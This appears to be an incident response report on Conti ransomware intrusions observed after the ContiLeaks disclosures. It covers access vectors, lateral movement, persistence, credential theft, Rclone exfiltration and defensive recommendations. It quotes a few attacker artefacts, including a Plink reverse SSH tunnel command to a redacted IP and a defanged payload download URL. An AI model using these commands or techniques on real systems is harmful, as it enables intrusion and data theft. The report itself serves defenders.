Executive Summary
In February 2022, a Twitter account which uses the handle ‘ContiLeaks’, started to publicly release information
for the operations of the cybercrime group behind the Conti ransomware. The leaked data included private
conversations between members along with source code of various panels and tools (e.g. Team9 backdoor panel
[1]). Furthermore, even though the leaks appeared to have a focus on the people behind the Conti operations,
the leaked data confirmed (at least to the public domain) that the Conti operators are part of the group, which
operates under the ‘TheTrick’ ecosystem. For the past few months, there was a common misconception that
Conti was a different entity.
Despite the public disclosure of their arsenal, it appears that Conti operators continue their business as usual by
proceeding to compromise networks, exfiltrating data and finally deploying their ransomware. This post describes
the methods and techniques we observed during recent incidents that took place after the Conti data leaks.
Our findings can be summarised as below:
Multiple different initial access vectors have been observed.
The operator(s) use service accounts of the victim’s Antivirus product in order to laterally move through the
estate and deploy the ransomware.

After getting access, the operator(s) attempted to remove the installed Antivirus product through the
execution of batch scripts.
To achieve persistence in the compromised hosts, multiple techniques were observed;
Service created for the execution of Cobalt Strike.
Multiple legitimate remote access software, ‘AnyDesk’, ‘Splashtop’ and ‘Atera’, were deployed. (Note:
This has been reported in the past too by different vendors)
Local admin account ‘Crackenn’ created. (Note: This has been previously reported by Truesec
as a Conti behaviour [2])
Before starting the ransomware activity, the operators exfiltrated data from the network with the legitimate
software ‘Rclone’ [3].
It should be noted that the threat actor(s) might use different tools or techniques in some stages of the
compromise.

Initial Access
Multiple initial access vectors have been observed recently; phishing emails and the exploitation of Microsoft
Exchange servers. The phishing email delivered to an employer proceeded to deploy Qakbot to the users Citrix
session. The targeting of Microsoft Exchange saw ProxyShell and ProxyLogon vulnerabilities exploited. When
this vector was observed, the compromise of the Exchange servers often took place two – three months prior to
the post exploitation phase. This behaviour suggests that the team responsible for gaining initial access
compromised a large number of estates in a small timeframe.
With a number of engagements, it was not possible to ascertain the initial access due to dwell time and evidence
retention. However, other initial access vectors utilised by the Conti operator(s) are:
Credential brute-force
Use of publicly available exploits. We have observed the following exploits being used:
Fortigate VPN
CVE-2018-13379
CVE-2018-13374
Log4Shell
CVE-2021-44228
Phishing e-mail sent by a legitimate compromised account.

Lateral Movement
In one incident, after gaining access to the first compromised host, we observed the threat actor carrying out the
following actions:
Download AnyDesk from hxxps://37.221.113[.]100/anydesk.exe
Deployment of the following batch files:
1.bat, 2.bat, 111.bat
Ransomware propagation
Removesophos.bat, uninstallSophos.bat
Uninstalls Sophos Antivirus solution
Aspx.bat
Contains a command-line, which executes the dropped executable file ‘ekern.exe’.
‘ekern.exe’ is a command line connection tool known as Plink [4]
This file establishes a reverse SSH tunnel that allows direct RDP connection to the
compromised host.
ekern.exe -ssh -P 53 -l redacted-pw redacted -R REDACTED_IP:59000:127.0.0.1:3389

2/5

After executing the above files, we observed the following utilities being used for reconnaissance and movement:
RDP
ADFind
Bloodhound to identify the network topology.
netscan.exe for network shares discovery.
Cobalt Strike deployed allowing the threat actor to laterally move throughout the network.
The common techniques across the multiple Conti engagements are the use of RDP and Cobalt Strike.

Persistence
The threat actor leveraged Windows services to add persistence for the Cobalt Strike beacon. The primary
persistence method was a Windows service, an example can be observed below:
A service was installed in the system.
Service Name: REDACTED
Service File Name: cmd.exe /c C:\ProgramData\1.msi
Service Type: user mode service
Service Start Type: demand start
Service Account: LocalSystem
In addition, services were also installed to provide persistence for the Remote Access Tools deployed by the
threat actor:
AnyDesk
Splashtop
Atera
Another Conti engagement saw no methods of persistence. However, a temporary service was created to
execute Cobalt Strike. It is hypothesized that the threat actor planned to achieve their objective quickly and
therefore used services for execution rather than persistence.
In a separate engagement, where the initial access vector was phishing and lead to the deployment of Qakbot,
the threat actor proceeded to create a local admin account named ‘Crackenn’ for persistence on the host.

Privilege Escalation
Conti operator(s) managed to escalate their privileges by compromising and using different accounts that were
found in the compromised host. The credentials compromised in multiple engagements was achieved by
deploying tools such as Mimikatz.
One operator was also observed exploiting ZeroLogon to obtain credentials and move laterally.

Exfiltration and Encryption
Similar to many other threat actors, Conti operator(s) exfiltrate a large amount of data from the compromised
network using the legitimate software ‘Rclone’. ‘Rclone’ was configured to upload to either Mega cloud storage
provider or to a threat actor controlled server. Soon after the data exfiltration, the threat actor(s) started the data

encryption. In addition, we estimate that the average time between the lateral movement and encryption is five
days.
As discussed earlier on, the average dwell time of a Conti compromise is heavily dependant on the initial access
method. Those incidents that have involved ProxyShell and ProxyLogon, the time between initial access and
lateral movement has been three – six months. However once lateral movement is conducted, time to completing
their objective is a matter of days.

Recommendations
Monitor firewalls for traffic categorised as filesharing
Monitor firewalls for anomalous spikes in data leaving the network
Patch externally facing services immediately
Monitor installed software for remote access tools
Restrict RDP and SMB access between hosts
Implement a Robust Password Policy [5]
Provide regular security awareness training
